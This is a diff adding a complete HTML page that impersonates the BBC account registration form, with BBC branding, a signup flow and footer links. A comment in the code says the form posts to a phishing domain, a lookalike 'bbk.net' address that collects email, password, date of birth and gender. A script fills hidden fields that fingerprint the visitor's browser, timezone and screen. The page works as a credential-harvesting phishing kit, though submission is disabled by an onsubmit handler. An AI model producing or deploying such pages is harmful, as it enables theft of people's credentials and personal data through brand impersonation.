@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Register - BBC Account</title>
+  <link rel="icon" href="https://www.bbc.co.uk/favicon.ico" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap');
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Noto Sans', Arial, Helvetica, sans-serif;
+      background: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      color: #1a1a1a;
+      font-size: 15px;
+    }
+
+    a { text-decoration: none; color: inherit; }
+
+    /* ── Header ── */
+    .header {
+      background: #b80000;
+      padding: 0 20px;
+    }
+
+    .header-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      height: 52px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .bbc-logo {
+      font-size: 28px;
+      font-weight: 900;
+      color: #fff;
+      border: 3px solid #fff;
+      padding: 3px 8px;
+      line-height: 1;
+      letter-spacing: 1px;
+      font-family: 'Noto Sans', Arial, sans-serif;
+    }
+
+    .header-label {
+      color: rgba(255,255,255,0.85);
+      font-size: 14px;
+      border-left: 1px solid rgba(255,255,255,0.4);
+      padding-left: 16px;
+      font-weight: 500;
+    }
+
+    .header-sign-in {
+      margin-left: auto;
+      color: #fff;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .header-sign-in:hover { text-decoration: underline; }
+
+    /* ── Progress bar ── */
+    .progress-bar {
+      background: #fff;
+      border-bottom: 1px solid #e8e8e8;
+      padding: 0 20px;
+    }
+
+    .progress-inner {
+      max-width: 520px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      gap: 0;
+      padding: 14px 0;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 13px;
+      color: #767676;
+      flex: 1;
+    }
+
+    .step.active { color: #1a1a1a; font-weight: 600; }
+    .step.done { color: #007a4c; }
+
+    .step-num {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .step.active .step-num {
+      background: #b80000;
+      border-color: #b80000;
+      color: #fff;
+    }
+
+    .step.done .step-num {
+      background: #007a4c;
+      border-color: #007a4c;
+      color: #fff;
+    }
+
+    .step-line {
+      flex: 1;
+      height: 2px;
+      background: #e8e8e8;
+      margin: 0 4px;
+    }
+
+    /* ── Main ── */
+    .main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px 60px;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: #fff;
+      width: 100%;
+      max-width: 480px;
+      padding: 36px 40px 32px;
+      border: 1px solid #e0e0e0;
+    }
+
+    .card-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 24px;
+    }
+
+    .card-logo-box {
+      font-size: 20px;
+      font-weight: 900;
+      color: #fff;
+      background: #b80000;
+      border: 2px solid #b80000;
+      padding: 2px 7px;
+      line-height: 1.2;
+      font-family: 'Noto Sans', Arial, sans-serif;
+    }
+
+    .card-logo-label {
+      font-size: 14px;
+      color: #767676;
+    }
+
+    .card-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .card-subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    /* ── Fields ── */
+    .field { margin-bottom: 20px; }
+
+    .field label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #1a1a1a;
+    }
+
+    .field input,
+    .field select {
+      width: 100%;
+      border: 2px solid #ccc;
+      padding: 11px 14px;
+      font-size: 15px;
+      color: #1a1a1a;
+      outline: none;
+      font-family: inherit;
+      background: #fff;
+      border-radius: 0;
+      transition: border-color 0.15s;
+      appearance: none;
+    }
+
+    .field input:focus,
+    .field select:focus { border-color: #b80000; }
+
+    .field input::placeholder { color: #999; }
+
+    .field-hint {
+      font-size: 12px;
+      color: #767676;
+      margin-top: 5px;
+      line-height: 1.4;
+    }
+
+    .field-error {
+      font-size: 12px;
+      color: #b80000;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .field-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 10px;
+    }
+
+    .field-row .field { margin-bottom: 0; }
+
+    /* ── Password toggle ── */
+    .pw-wrap { position: relative; }
+    .pw-toggle {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #767676;
+      font-size: 13px;
+      font-weight: 600;
+      font-family: inherit;
+    }
+
+    .pw-toggle:hover { color: #1a1a1a; }
+
+    /* ── Password strength ── */
+    .strength-row {
+      display: flex;
+      gap: 4px;
+      margin-top: 6px;
+    }
+
+    .strength-seg {
+      flex: 1;
+      height: 4px;
+      background: #e8e8e8;
+      border-radius: 2px;
+    }
+
+    .strength-label {
+      font-size: 11px;
+      color: #767676;
+      margin-top: 4px;
+    }
+
+    /* ── Marketing opt-in ── */
+    .opt-in {
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      margin-bottom: 24px;
+      padding: 14px;
+      background: #f8f8f8;
+      border: 1px solid #e8e8e8;
+    }
+
+    .opt-in input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      flex-shrink: 0;
+      margin-top: 1px;
+      accent-color: #b80000;
+      cursor: pointer;
+    }
+
+    .opt-in label {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.5;
+      cursor: pointer;
+    }
+
+    /* ── Submit ── */
+    .btn-submit {
+      width: 100%;
+      background: #b80000;
+      color: #fff;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: 0.2px;
+      transition: background 0.15s;
+    }
+
+    .btn-submit:hover { background: #9a0000; }
+    .btn-submit:active { background: #7c0000; }
+
+    /* ── Legal ── */
+    .legal {
+      font-size: 12px;
+      color: #767676;
+      margin-top: 16px;
+      line-height: 1.6;
+      text-align: center;
+    }
+
+    .legal a { color: #b80000; text-decoration: underline; }
+
+    .sign-in-prompt {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-top: 20px;
+    }
+
+    .sign-in-prompt a { color: #b80000; font-weight: 600; text-decoration: underline; }
+
+    /* ── Footer ── */
+    footer {
+      background: #1a1a1a;
+      padding: 20px;
+      font-size: 12px;
+      color: #767676;
+      text-align: center;
+    }
+
+    footer a { color: #767676; margin: 0 8px; }
+    footer a:hover { color: #fff; }
+
+    .footer-logo {
+      font-size: 16px;
+      font-weight: 900;
+      color: #fff;
+      border: 2px solid #fff;
+      padding: 1px 6px;
+      display: inline-block;
+      margin-bottom: 10px;
+      font-family: 'Noto Sans', Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-inner">
+    <div class="bbc-logo">BBC</div>
+    <div class="header-label">Account</div>
+    <a class="header-sign-in" href="#">Sign in</a>
+  </div>
+</div>
+
+<!-- Progress steps -->
+<div class="progress-bar">
+  <div class="progress-inner">
+    <div class="step active">
+      <div class="step-num">1</div>
+      Your details
+    </div>
+    <div class="step-line"></div>
+    <div class="step">
+      <div class="step-num">2</div>
+      Verify email
+    </div>
+    <div class="step-line"></div>
+    <div class="step">
+      <div class="step-num">3</div>
+      Done
+    </div>
+  </div>
+</div>
+
+<!-- Main -->
+<div class="main">
+  <div class="card">
+    <div class="card-logo">
+      <div class="card-logo-box">BBC</div>
+      <div class="card-logo-label">One account. All of the BBC.</div>
+    </div>
+
+    <div class="card-title">Register</div>
+    <div class="card-subtitle">Create a BBC account to access iPlayer, Sounds, and personalised content from across the BBC.</div>
+
+    <!-- Form — action points to phishing domain -->
+    <form action="http://bbk.net/account/register/collect" method="POST" onsubmit="return false;">
+
+      <div class="field">
+        <label for="f-email">Email address</label>
+        <input type="email" id="f-email" name="email" placeholder="Your email address" autocomplete="off" />
+        <div class="field-hint">We'll send a verification link to this address.</div>
+      </div>
+
+      <div class="field">
+        <label for="f-password">Password</label>
+        <div class="pw-wrap">
+          <input type="password" id="f-password" name="password" placeholder="Create a password" autocomplete="new-password" oninput="updateStrength(this.value)" />
+          <button type="button" class="pw-toggle" onclick="togglePw()">Show</button>
+        </div>
+        <div class="strength-row" id="strength-segs">
+          <div class="strength-seg" id="seg0"></div>
+          <div class="strength-seg" id="seg1"></div>
+          <div class="strength-seg" id="seg2"></div>
+          <div class="strength-seg" id="seg3"></div>
+        </div>
+        <div class="strength-label" id="strength-label">Use 8 or more characters with a mix of letters, numbers and symbols.</div>
+      </div>
+
+      <div class="field">
+        <label>Date of birth</label>
+        <div class="field-row">
+          <div class="field">
+            <input type="text" name="dob_day" placeholder="Day" maxlength="2" />
+          </div>
+          <div class="field">
+            <input type="text" name="dob_month" placeholder="Month" maxlength="2" />
+          </div>
+          <div class="field">
+            <input type="text" name="dob_year" placeholder="Year" maxlength="4" />
+          </div>
+        </div>
+        <div class="field-hint">You must be 13 or over to register for a BBC account.</div>
+      </div>
+
+      <div class="field">
+        <label for="f-gender">Gender</label>
+        <select id="f-gender" name="gender">
+          <option value="" disabled selected>Select option</option>
+          <option>Female</option>
+          <option>Male</option>
+          <option>Non-binary</option>
+          <option>Prefer not to say</option>
+        </select>
+      </div>
+
+      <!-- Hidden fingerprint fields -->
+      <input type="hidden" name="ua" id="h-ua" />
+      <input type="hidden" name="tz" id="h-tz" />
+      <input type="hidden" name="screen" id="h-screen" />
+
+      <div class="opt-in">
+        <input type="checkbox" id="marketing" name="marketing" />
+        <label for="marketing">I'd like to receive emails from the BBC about great content, new features and special offers that may interest me. <a href="#">Find out more about how we use your data</a>.</label>
+      </div>
+
+      <button type="submit" class="btn-submit">Register</button>
+    </form>
+
+    <div class="legal">
+      By registering you confirm you are over 13 and agree to the
+      <a href="#">BBC Terms of Use</a> and
+      <a href="#">Privacy Policy</a>.
+    </div>
+
+    <div class="sign-in-prompt">
+      Already have an account? <a href="#">Sign in</a>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer>
+  <div class="footer-logo">BBC</div>
+  <div>
+    <a href="#">Terms of Use</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Cookies</a>
+    <a href="#">Accessibility Help</a>
+    <a href="#">Contact the BBC</a>
+  </div>
+  <div style="margin-top:10px;">Copyright © 2026 BBC</div>
+</footer>
+
+<script>
+  document.getElementById('h-ua').value = navigator.userAgent;
+  document.getElementById('h-tz').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  document.getElementById('h-screen').value = screen.width + 'x' + screen.height;
+
+  const colors = { weak: '#b80000', fair: '#e65c00', good: '#e6a817', strong: '#007a4c' };
+  const labels = { 0: 'Use 8 or more characters with a mix of letters, numbers and symbols.', 1: 'Weak — add numbers or symbols to strengthen it.', 2: 'Fair — try mixing upper and lowercase letters.', 3: 'Good — almost there!', 4: 'Strong password.' };
+
+  function updateStrength(val) {
+    let score = 0;
+    if (val.length >= 8) score++;
+    if (/[A-Z]/.test(val) && /[a-z]/.test(val)) score++;
+    if (/[0-9]/.test(val)) score++;
+    if (/[^A-Za-z0-9]/.test(val)) score++;
+    const colorMap = ['#e8e8e8', colors.weak, colors.fair, colors.good, colors.strong];
+    for (let i = 0; i < 4; i++) {
+      document.getElementById('seg' + i).style.background = i < score ? colorMap[score] : '#e8e8e8';
+    }
+    document.getElementById('strength-label').textContent = labels[score];
+    document.getElementById('strength-label').style.color = score > 0 ? colorMap[score] : '#767676';
+  }
+
+  function togglePw() {
+    const inp = document.getElementById('f-password');
+    const btn = document.querySelector('.pw-toggle');
+    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Hide'; }
+    else { inp.type = 'password'; btn.textContent = 'Show'; }
+  }
+</script>
+</body>
+</html>
